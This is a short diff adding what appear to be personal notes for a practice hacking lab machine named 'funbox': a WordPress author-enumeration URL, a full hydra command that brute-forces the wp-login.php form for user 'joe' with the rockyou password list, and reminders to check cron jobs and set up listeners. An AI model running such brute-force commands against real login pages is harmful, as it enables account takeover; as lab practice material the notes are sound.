@@ -1,0 +1,4 @@
+http://funbox.fritz.box/?author=2
+hydra -l joe -P rockyou.txt funbox.fritz.box -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+Check for cron jobs
+Throw up multiple listeners.
